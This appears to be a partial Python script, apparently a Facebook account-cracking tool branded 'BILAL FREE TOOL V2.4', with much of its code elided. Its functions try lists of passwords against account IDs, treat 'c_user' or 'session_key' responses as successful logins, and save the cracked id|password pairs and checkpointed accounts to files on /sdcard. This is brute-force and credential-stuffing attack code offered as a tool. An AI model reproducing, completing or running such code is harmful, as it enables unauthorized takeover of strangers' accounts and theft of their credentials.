...
######  ### ####### #     # #######                                       
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m BILAL AHMED
\033[1;37m[-] GITHUB    :\033[1;32m MR BILAL420
\033[1;37m[-] VERSION   :\033[1;32m 2.4
\033[1;37m[-] STATUS    :\033[1;32m PREMIUM
--------------------------------------------
[-] BILAL FREE TOOL V2.4
[-] Update every 2 days
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [BXK-OK] %s | %s'%(ids,pas))
                                open('/sdcard/JXB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BXK-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [BILAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BXK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BXK-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/BXK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
